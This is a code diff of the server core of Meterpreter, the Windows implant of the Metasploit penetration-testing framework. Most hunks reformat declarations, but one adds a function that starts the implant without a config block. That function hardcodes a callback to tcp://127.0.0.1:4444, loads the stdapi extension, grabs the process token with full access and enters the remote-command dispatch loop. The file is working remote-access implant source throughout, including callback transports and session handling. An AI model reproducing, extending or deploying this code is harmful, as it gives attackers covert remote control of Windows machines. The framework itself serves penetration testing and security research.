@@ -10,7 +10,7 @@
 #include "server_transport_named_pipe.h"
 #include "packet_encryption.h"
 
-extern Command* extensionCommands;
+extern Command *extensionCommands;
 
 int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
 {
@@ -23,10 +23,10 @@ int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
  */
 DWORD server_sessionid()
 {
-	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );
+	typedef BOOL(WINAPI * PROCESSIDTOSESSIONID)(DWORD pid, LPDWORD id);
 
 	static PROCESSIDTOSESSIONID processIdToSessionId = NULL;
-	HMODULE kernel	 = NULL;
+	HMODULE kernel = NULL;
 	DWORD sessionId = 0;
 
 	do
@@ -50,7 +50,7 @@ DWORD server_sessionid()
 			sessionId = -1;
 		}
 
-	} while( 0 );
+	} while (0);
 
 	if (kernel)
 	{
@@ -66,14 +66,14 @@ DWORD server_sessionid()
  * @param fd The socket descriptor passed to metsrv during intialisation.
  * @return Pointer to the end of the configuration.
  */
-LPBYTE load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensions)
+LPBYTE load_stageless_extensions(Remote *remote, MetsrvExtension *stagelessExtensions)
 {
 	while (stagelessExtensions->size > 0)
 	{
 		dprintf("[SERVER] Extension located at 0x%p: %u bytes", stagelessExtensions->dll, stagelessExtensions->size);
 		HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size, MAKEINTRESOURCEA(EXPORT_REFLECTIVELOADER));
 		load_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
-		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
+		stagelessExtensions = (MetsrvExtension *)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
 	}
 
 	dprintf("[SERVER] All stageless extensions loaded");
@@ -82,26 +82,26 @@ LPBYTE load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExten
 	LPBYTE initData = (LPBYTE)(&stagelessExtensions->size) + sizeof(stagelessExtensions->size);
 
 	// Config blog is terminated by a -1
-	while (*(UINT*)initData != 0xFFFFFFFF)
+	while (*(UINT *)initData != 0xFFFFFFFF)
 	{
-		UINT extensionId = *(UINT*)initData;
-		DWORD dataSize = *(DWORD*)(initData + sizeof(DWORD));
+		UINT extensionId = *(UINT *)initData;
+		DWORD dataSize = *(DWORD *)(initData + sizeof(DWORD));
 		UINT offset = sizeof(UINT) + sizeof(DWORD);
 		LPBYTE data = initData + offset;
 		dprintf("[STAGELESS] init data at %p, ID %u, size is %d", initData, extensionId, dataSize);
 		stagelessinit_extension(extensionId, data, dataSize);
 		initData = data + dataSize;
 		dprintf("[STAGELESS] init done, now pointing to %p", initData);
-		dprintf("[STAGELESS] %p contains %x", *(UINT*)initData);
+		dprintf("[STAGELESS] %p contains %x", *(UINT *)initData);
 	}
 
 	dprintf("[SERVER] All stageless extensions initialised");
 	return initData + sizeof(UINT);
 }
 
-static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transportCommon, LPDWORD size)
+static Transport *create_transport(Remote *remote, MetsrvTransportCommon *transportCommon, LPDWORD size)
 {
-	Transport* transport = NULL;
+	Transport *transport = NULL;
 	dprintf("[TRNS] Transport claims to have URL: %S", transportCommon->url);
 	dprintf("[TRNS] Transport claims to have comms: %d", transportCommon->comms_timeout);
 	dprintf("[TRNS] Transport claims to have retry total: %d", transportCommon->retry_total);
@@ -109,15 +109,15 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 
 	if (wcsncmp(transportCommon->url, L"tcp", 3) == 0)
 	{
-		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon, size);
+		transport = transport_create_tcp((MetsrvTransportTcp *)transportCommon, size);
 	}
 	else if (wcsncmp(transportCommon->url, L"pipe", 4) == 0)
 	{
-		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon, size);
+		transport = transport_create_named_pipe((MetsrvTransportNamedPipe *)transportCommon, size);
 	}
 	else
 	{
-		transport = transport_create_http((MetsrvTransportHttp*)transportCommon, size);
+		transport = transport_create_http((MetsrvTransportHttp *)transportCommon, size);
 	}
 
 	if (transport == NULL)
@@ -145,7 +145,7 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 	return transport;
 }
 
-static void append_transport(Transport** list, Transport* newTransport)
+static void append_transport(Transport **list, Transport *newTransport)
 {
 	if (*list == NULL)
 	{
@@ -164,7 +164,7 @@ static void append_transport(Transport** list, Transport* newTransport)
 	}
 }
 
-static void remove_transport(Remote* remote, Transport* oldTransport)
+static void remove_transport(Remote *remote, Transport *oldTransport)
 {
 	// if we point to ourself, then we're the last one
 	if (remote->transport->next_transport == remote->transport)
@@ -187,10 +187,10 @@ static void remove_transport(Remote* remote, Transport* oldTransport)
 	oldTransport->transport_destroy(oldTransport);
 }
 
-static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports, LPDWORD parsedSize)
+static BOOL create_transports(Remote *remote, MetsrvTransportCommon *transports, LPDWORD parsedSize)
 {
 	DWORD totalSize = 0;
-	MetsrvTransportCommon* current = transports;
+	MetsrvTransportCommon *current = transports;
 
 	// The first part of the transport is always the URL, if it's NULL, we are done.
 	while (current->url[0] != 0)
@@ -202,7 +202,7 @@ static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports,
 			totalSize += size;
 
 			// go to the next transport based on the size of the existing one.
-			current = (MetsrvTransportCommon*)((LPBYTE)current + size);
+			current = (MetsrvTransportCommon *)((LPBYTE)current + size);
 		}
 		else
 		{
@@ -217,11 +217,11 @@ static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports,
 	return TRUE;
 }
 
-static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LPDWORD size)
+static void config_create(Remote *remote, LPBYTE uuid, MetsrvConfig **config, LPDWORD size)
 {
 	// This function is really only used for migration purposes.
 	DWORD s = sizeof(MetsrvSession);
-	MetsrvSession* sess = (MetsrvSession*)malloc(s);
+	MetsrvSession *sess = (MetsrvSession *)malloc(s);
 	ZeroMemory(sess, s);
 
 	dprintf("[CONFIG] preparing the configuration");
@@ -241,8 +241,8 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 	}
 	sess->exit_func = EXITFUNC_THREAD; // migration we default to this.
 
-	Transport* current = remote->transport;
-	Transport* t = remote->transport;
+	Transport *current = remote->transport;
+	Transport *t = remote->transport;
 	do
 	{
 		// extend memory appropriately
@@ -250,7 +250,7 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 
 		dprintf("[CONFIG] Allocating %u bytes for transport, total of %u bytes", neededSize, s + neededSize);
 
-		sess = (MetsrvSession*)realloc(sess, s + neededSize);
+		sess = (MetsrvSession *)realloc(sess, s + neededSize);
 
 		// load up the transport specifics
 		LPBYTE target = (LPBYTE)sess + s;
@@ -266,22 +266,22 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 
 		switch (t->type)
 		{
-			case METERPRETER_TRANSPORT_TCP:
-			{
-				transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
-				break;
-			}
-			case METERPRETER_TRANSPORT_PIPE:
-			{
-				transport_write_named_pipe_config(t, (MetsrvTransportNamedPipe*)target);
-				break;
-			}
-			case METERPRETER_TRANSPORT_HTTP:
-			case METERPRETER_TRANSPORT_HTTPS:
-			{
-				transport_write_http_config(t, (MetsrvTransportHttp*)target);
-				break;
-			}
+		case METERPRETER_TRANSPORT_TCP:
+		{
+			transport_write_tcp_config(t, (MetsrvTransportTcp *)target);
+			break;
+		}
+		case METERPRETER_TRANSPORT_PIPE:
+		{
+			transport_write_named_pipe_config(t, (MetsrvTransportNamedPipe *)target);
+			break;
+		}
+		case METERPRETER_TRANSPORT_HTTP:
+		case METERPRETER_TRANSPORT_HTTPS:
+		{
+			transport_write_http_config(t, (MetsrvTransportHttp *)target);
+			break;
+		}
 		}
 
 		t = t->next_transport;
@@ -291,7 +291,7 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 	// Then terminate the extensions with a zero DWORD.
 	// Then terminate the config with a -1 DWORD
 	DWORD terminatorSize = sizeof(wchar_t) + sizeof(DWORD) + sizeof(DWORD);
-	sess = (MetsrvSession*)realloc(sess, s + terminatorSize);
+	sess = (MetsrvSession *)realloc(sess, s + terminatorSize);
 	memset((LPBYTE)sess + s, 0xFF, terminatorSize);
 	ZeroMemory((LPBYTE)sess + s, terminatorSize - sizeof(DWORD));
 	s += terminatorSize;
@@ -299,7 +299,235 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 	// hand off the data
 	dprintf("[CONFIG] Total of %u bytes located at 0x%p", s, sess);
 	*size = s;
-	*config = (MetsrvConfig*)sess;
+	*config = (MetsrvConfig *)sess;
+}
+/*
+DWORD server_setup_default_1()
+{
+	MetsrvConfig *config = malloc(sizeof(MetsrvConfig) + 8);
+	ZeroMemory(config, sizeof(MetsrvConfig) + 4);
+	//*(UINT*)(config+ sizeof(MetsrvConfig)+4) = 0xFFFFFFFF;
+
+	config->session.comms_handle.handle = NULL;
+	config->session.exit_func = EXITFUNC_THREAD;
+	config->session.expiry = 3600;
+
+	strncpy(config->transports[0].url, L"tcp://127.0.0.1:4444", UA_SIZE);
+	config->transports[0].comms_timeout = 30;
+	config->transports[0].retry_total = 600;
+	config->transports[0].retry_wait = 10;
+	server_setup(&config);
+}
+*/
+
+// for simple connection without config.
+DWORD server_setup_default()
+{
+	THREAD *serverThread = NULL;
+	Remote *remote = NULL;
+	char stationName[256] = {0};
+	char desktopName[256] = {0};
+	DWORD res = 0;
+
+	disable_thread_error_reporting();
+
+	srand((unsigned int)time(NULL));
+
+	__try
+	{
+		do
+		{
+			// Open a THREAD item for the servers main thread, we use this to manage migration later.
+			serverThread = thread_open();
+
+			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);
+
+			if (!(remote = remote_allocate()))
+			{
+				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+				break;
+			}
+
+			remote->sess_expiry_time = 3600;
+			remote->sess_start_time = current_unix_timestamp();
+			if (remote->sess_expiry_time)
+			{
+				remote->sess_expiry_end = remote->sess_start_time + remote->sess_expiry_time;
+			}
+			else
+			{
+				remote->sess_expiry_end = 0;
+			}
+
+			dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);
+
+			DWORD transportSize = 0;
+			MetsrvTransportCommon transport;
+			wcsncpy(transport.url, L"tcp://127.0.0.1:4444", UA_SIZE);
+			transport.comms_timeout = 30;
+			transport.retry_total = 600;
+			transport.retry_wait = 10;
+
+#if 1
+			if (!create_transport(remote, &transport, &transportSize))
+			{
+				// not good, bail out!
+				SetLastError(ERROR_BAD_ARGUMENTS);
+				break;
+			}
+#endif
+			// Set up the transport creation function pointer
+			remote->trans_create = create_transport;
+			// Set up the transport removal function pointer
+			remote->trans_remove = remove_transport;
+			// and the config creation pointer
+			remote->config_create = config_create;
+
+			// Store our thread handle
+			remote->server_thread = serverThread->handle;
+
+			dprintf("[SERVER] Registering dispatch routines...");
+			register_dispatch_routines();
+
+#if 1
+			HMODULE hLibrary = LoadLibraryA("ext_server_stdapi.x64.dll");
+			load_extension(hLibrary, FALSE, remote, NULL, extensionCommands);
+#endif
+
+			// Store our process token
+			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
+			{
+				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->server_token);
+			}
+
+#if 1
+			if (scheduler_initialize(remote) != ERROR_SUCCESS)
+			{
+				SetLastError(ERROR_BAD_ENVIRONMENT);
+				break;
+			}
+#endif
+			// Copy it to the thread token
+			remote->thread_token = remote->server_token;
+
+			// Save the initial session/station/desktop names...
+			remote->orig_sess_id = server_sessionid();
+			remote->curr_sess_id = remote->orig_sess_id;
+			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &stationName, 256, NULL);
+			remote->orig_station_name = _strdup(stationName);
+			remote->curr_station_name = _strdup(stationName);
+			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &desktopName, 256, NULL);
+			remote->orig_desktop_name = _strdup(desktopName);
+			remote->curr_desktop_name = _strdup(desktopName);
+
+			remote->sess_start_time = current_unix_timestamp();
+
+			dprintf("[SERVER] Time to kick off connectivity to MSF ...");
+			// loop through the transports, reconnecting each time.
+			while (remote->transport)
+			{
+				if (remote->transport->transport_init)
+				{
+					dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport);
+					// Each transport has its own set of retry settings and each should honour
+					// them individually.
+					if (remote->transport->transport_init(remote->transport) != ERROR_SUCCESS)
+					{
+						dprintf("[SERVER] transport initialisation failed, moving to the next transport");
+						remote->transport = remote->transport->next_transport;
+
+						// when we have a list of transports, we'll iterate to the next one.
+						continue;
+					}
+				}
+
+				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
+				DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);
+
+				dprintf("[DISPATCH] dispatch exited with result: %u", dispatchResult);
+				if (remote->transport->transport_deinit)
+				{
+					dprintf("[DISPATCH] deinitialising transport");
+					remote->transport->transport_deinit(remote->transport);
+				}
+
+				dprintf("[TRANS] resetting transport");
+				if (remote->transport->transport_reset)
+				{
+					remote->transport->transport_reset(remote->transport, dispatchResult == ERROR_SUCCESS && remote->next_transport == NULL);
+				}
+
+				// If the transport mechanism failed, then we should loop until we're able to connect back again.
+				if (dispatchResult == ERROR_SUCCESS)
+				{
+					dprintf("[DISPATCH] Server requested shutdown of dispatch");
+					// But if it was successful, and this is a valid exit, then we should clean up and leave.
+					if (remote->next_transport == NULL)
+					{
+						dprintf("[DISPATCH] No next transport specified, leaving");
+						// we weren't asked to switch transports, so we exit.
+						break;
+					}
+
+					// we need to change transports to the one we've been given. We will assume, for now,
+					// that the transport has been created using the appropriate functions and that it is
+					// part of the transport list.
+					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->next_transport);
+					remote->transport = remote->next_transport;
+					remote->next_transport = NULL;
+				}
+				else
+				{
+					// move to the next one in the list
+					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->transport->next_transport);
+					remote->transport = remote->transport->next_transport;
+				}
+
+				// transport switching and failover both need to support the waiting functionality.
+				if (remote->next_transport_wait > 0)
+				{
+					dprintf("[TRANS] Sleeping for %u seconds ...", remote->next_transport_wait);
+
+					sleep(remote->next_transport_wait);
+
+					// the wait is a once-off thing, needs to be reset each time
+					remote->next_transport_wait = 0;
+				}
+
+				// if we had an encryption context we should clear it up.
+				free_encryption_context(remote);
+			}
+
+			// clean up the transports
+			while (remote->transport)
+			{
+				remove_transport(remote, remote->transport);
+			}
+
+			dprintf("[SERVER] Deregistering dispatch routines...");
+			deregister_dispatch_routines(remote);
+
+
+
+		} while (0);
+
+		dprintf("[DISPATCH] calling scheduler_destroy...");
+		scheduler_destroy();
+
+		dprintf("[DISPATCH] calling command_join_threads...");
+		command_join_threads();
+
+		remote_deallocate(remote);
+	}
+	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
+	{
+		dprintf("[SERVER] *** exception triggered!");
+
+		thread_kill(serverThread);
+	}
+
+	dprintf("[SERVER] Finished.");
+	return res;
 }
 
 /*!
@@ -307,12 +535,12 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
  * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
  * @return Meterpreter exit code (ignored by the caller).
  */
-DWORD server_setup(MetsrvConfig* config)
+DWORD server_setup(MetsrvConfig *config)
 {
-	THREAD* serverThread = NULL;
-	Remote* remote = NULL;
-	char stationName[256] = { 0 };
-	char desktopName[256] = { 0 };
+	THREAD *serverThread = NULL;
+	Remote *remote = NULL;
+	char stationName[256] = {0};
+	char desktopName[256] = {0};
 	DWORD res = 0;
 
 	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
@@ -320,16 +548,16 @@ DWORD server_setup(MetsrvConfig* config)
 	dprintf("[SESSION] Expiry: %u", config->session.expiry);
 
 	dprintf("[SERVER] UUID: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-		config->session.uuid[0], config->session.uuid[1], config->session.uuid[2], config->session.uuid[3],
-		config->session.uuid[4], config->session.uuid[5], config->session.uuid[6], config->session.uuid[7],
-		config->session.uuid[8], config->session.uuid[9], config->session.uuid[10], config->session.uuid[11],
-		config->session.uuid[12], config->session.uuid[13], config->session.uuid[14], config->session.uuid[15]);
+			config->session.uuid[0], config->session.uuid[1], config->session.uuid[2], config->session.uuid[3],
+			config->session.uuid[4], config->session.uuid[5], config->session.uuid[6], config->session.uuid[7],
+			config->session.uuid[8], config->session.uuid[9], config->session.uuid[10], config->session.uuid[11],
+			config->session.uuid[12], config->session.uuid[13], config->session.uuid[14], config->session.uuid[15]);
 
 	dprintf("[SERVER] Session GUID: %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
-		config->session.session_guid[0], config->session.session_guid[1], config->session.session_guid[2], config->session.session_guid[3],
-		config->session.session_guid[4], config->session.session_guid[5], config->session.session_guid[6], config->session.session_guid[7],
-		config->session.session_guid[8], config->session.session_guid[9], config->session.session_guid[10], config->session.session_guid[11],
-		config->session.session_guid[12], config->session.session_guid[13], config->session.session_guid[14], config->session.session_guid[15]);
+			config->session.session_guid[0], config->session.session_guid[1], config->session.session_guid[2], config->session.session_guid[3],
+			config->session.session_guid[4], config->session.session_guid[5], config->session.session_guid[6], config->session.session_guid[7],
+			config->session.session_guid[8], config->session.session_guid[9], config->session.session_guid[10], config->session.session_guid[11],
+			config->session.session_guid[12], config->session.session_guid[13], config->session.session_guid[14], config->session.session_guid[15]);
 
 	disable_thread_error_reporting();
 
@@ -389,9 +617,9 @@ DWORD server_setup(MetsrvConfig* config)
 
 			dprintf("[SERVER] Registering dispatch routines...");
 			register_dispatch_routines();
-			
+
 			// this has to be done after dispatch routine are registered
-			LPBYTE configEnd = load_stageless_extensions(remote, (MetsrvExtension*)((LPBYTE)config->transports + transportSize));
+			LPBYTE configEnd = load_stageless_extensions(remote, (MetsrvExtension *)((LPBYTE)config->transports + transportSize));
 
 			dprintf("[SERVER] Copying configuration ..");
 			// the original config can actually be mapped as RX in cases such as when stageless payloads
@@ -400,7 +628,7 @@ DWORD server_setup(MetsrvConfig* config)
 			// configuration block down the track. So instead of marking the original configuration as RWX (to cover
 			// all cases) we will instead just muck with a copy of it on the heap.
 			DWORD_PTR configSize = (DWORD_PTR)configEnd - (DWORD_PTR)config;
-			remote->orig_config = (MetsrvConfig*)malloc(configSize);
+			remote->orig_config = (MetsrvConfig *)malloc(configSize);
 			memcpy_s(remote->orig_config, configSize, config, configSize);
 			dprintf("[SERVER] Config copied..");
 
